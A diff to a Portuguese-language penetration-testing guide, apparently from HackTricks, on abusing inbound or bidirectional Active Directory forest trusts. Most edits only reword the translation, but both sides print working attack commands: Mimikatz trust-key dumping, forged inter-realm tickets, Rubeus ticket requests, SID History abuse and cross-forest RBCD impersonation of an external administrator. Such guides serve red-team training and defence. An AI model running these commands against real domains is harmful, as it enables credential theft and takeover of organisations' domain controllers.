@@ -1,12 +1,12 @@
-# Domínio de Forest Externa - OneWay (Inbound) ou bidirecional
+# Floresta de Domínio Externa - OneWay (Inbound) ou bidirecional
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Neste cenário, um domínio externo confia em você (ou ambos confiam um no outro), então você pode obter algum tipo de acesso a ele.
+Neste cenário, um domínio externo confia em você (ou ambos confiam um no outro), portanto, você pode obter algum tipo de acesso a ele.
 
-## Enumeração
+## Enumeration
 
-Antes de tudo, você precisa **enumerar** a **trust**:
+Antes de tudo, você precisa **enumerate** a **trust**:
 ```bash
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
@@ -63,11 +63,11 @@ Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFil
 
 Na enumeração anterior, foi descoberto que o usuário **`crossuser`** está dentro do grupo **`External Admins`**, que possui **acesso de Admin** dentro do **DC do domínio externo**.
 
-## Acesso Inicial
+## Acesso inicial
 
 Se você **não conseguiu** encontrar nenhum acesso **especial** do seu usuário no outro domínio, ainda pode voltar à AD Methodology e tentar fazer **privesc a partir de um usuário sem privilégios** (coisas como kerberoasting, por exemplo):
 
-Você pode usar as **funções do Powerview** para **enumerar** o **outro domínio**, usando o parâmetro `-Domain`, como em:
+Você pode usar **funções do Powerview** para **enumerar** o **outro domínio** usando o parâmetro `-Domain`, como em:
 ```bash
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
@@ -79,35 +79,35 @@ Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 
 ### Fazendo login
 
-Usando um método regular com as credenciais dos usuários que têm acesso ao domínio externo, você deve conseguir acessar:
+Usando um método regular com as credenciais dos usuários que têm acesso ao external domain, você deverá conseguir acessá-lo:
 ```bash
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
 ### SID History Abuse
 
-Você também pode abusar do [**SID History**](sid-history-injection.md) em um forest trust.
+Você também poderia abusar do [**SID History**](sid-history-injection.md) através de um forest trust.
 
-Se um usuário for migrado **de uma forest para outra** e o **SID Filtering não estiver habilitado**, torna-se possível **adicionar um SID da outra forest**, e esse **SID** será **adicionado ao token do usuário** durante a autenticação **através do trust**.
+Se um usuário for migrado **de uma forest para outra** e o **SID Filtering não estiver habilitado**, torna-se possível **adicionar um SID da outra forest**, e esse **SID** será **adicionado** ao **token do usuário** durante a autenticação **através do trust**.
 
 > [!WARNING]
-> Como lembrete, você pode obter a chave de assinatura com
+> Como lembrete, você pode obter a signing key com
 >
 > ```bash
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 > ```
 
-Você poderia **assinar com** a chave **confiável** um **TGT personificando** o usuário do domínio atual.
+Você poderia **assinar com** a chave **confiável** um **TGT se passando por** um usuário do domínio atual.
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
 
 # Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
 ## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
-Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap
+Rubeus.exe asktgs /service:cifs/dc.domain.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-### Impersonação completa do usuário
+### Forma completa de impersonar o usuário
 ```bash
 # Get a TGT of the user with cross-domain permissions
 Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap
@@ -117,13 +117,13 @@ Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:d
 
 # Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
 ## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
-Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap
+Rubeus.exe asktgs /service:cifs/dc.domain.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-### RBCD cross-forest quando você controla uma conta de máquina na floresta confiadora (sem filtragem de SID / autenticação seletiva)
+### RBCD entre florestas quando você controla uma conta de máquina na forest de confiança (sem filtragem de SID / autenticação seletiva)
 
-Se o seu foreign principal (FSP) colocar você em um grupo que possa gravar objetos de computador na floresta confiadora (por exemplo, `Account Operators`, grupo de provisionamento personalizado), você poderá configurar **Resource-Based Constrained Delegation** em um host-alvo dessa floresta e se passar por qualquer usuário nela:
+Se o seu foreign principal (FSP) colocar você em um grupo que possa gravar objetos de computador na forest de confiança (por exemplo, `Account Operators` ou um grupo de provisionamento personalizado), você poderá configurar **Resource-Based Constrained Delegation** em um host-alvo dessa forest e se passar por qualquer usuário nela:
 ```bash
 # 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
 # 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that account
@@ -134,15 +134,14 @@ Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=
 # 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
 Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
 ```
-Isso só funciona quando **SelectiveAuthentication está desabilitado** e o **SID filtering** não remove o SID sob seu controle. É um caminho lateral rápido que evita a falsificação de SIDHistory e costuma passar despercebido em análises de trust.<sup>[[2]](#references)</sup>
+Isso só funciona quando **SelectiveAuthentication está desabilitado** e o **SID filtering** não remove seu SID de controle. É um caminho lateral rápido que evita o forging de SIDHistory e costuma ser ignorado em revisões de trust.<sup>[[2]](#references)</sup>
 
-### Endurecimento da validação do PAC
+### Fortalecimento da validação do PAC
 
-As atualizações de validação da assinatura do PAC para **CVE-2024-26248**/**CVE-2024-29056** adicionam a exigência de assinatura em tickets entre forests. No **Compatibility mode**, caminhos forjados de PAC/SIDHistory/S4U entre realms ainda podem funcionar em DCs sem patch. No **Enforcement mode**, dados de PAC sem assinatura ou adulterados que atravessem um forest trust são rejeitados, a menos que você também possua a trust key do forest de destino. Substituições do Registry (`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`) podem enfraquecer essa proteção enquanto continuarem disponíveis.<sup>[[1]](#references)</sup>
+As atualizações de validação de assinatura do PAC para **CVE-2024-26248**/**CVE-2024-29056** adicionam a exigência de assinatura em tickets inter-forest. No **Compatibility mode**, caminhos forjados de PAC inter-realm/SIDHistory/S4U ainda podem funcionar em DCs sem patch. No **Enforcement mode**, dados de PAC sem assinatura ou adulterados que atravessem um forest trust são rejeitados, a menos que você também possua a trust key do forest de destino. Substituições no Registry (`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`) podem enfraquecer isso enquanto continuarem disponíveis.<sup>[[1]](#references)</sup>
 
-## Referências
+## References
 
 - [1] [Microsoft KB5037754 – Alterações na validação do PAC para CVE-2024-26248 e CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
-- [2] [Especificação MS-PAC – detalhes sobre SID filtering e transformação de claims](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
-
+- [2] [Especificação MS-PAC – Detalhes sobre SID filtering e transformação de claims](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
 {{#include ../../banners/hacktricks-training.md}}
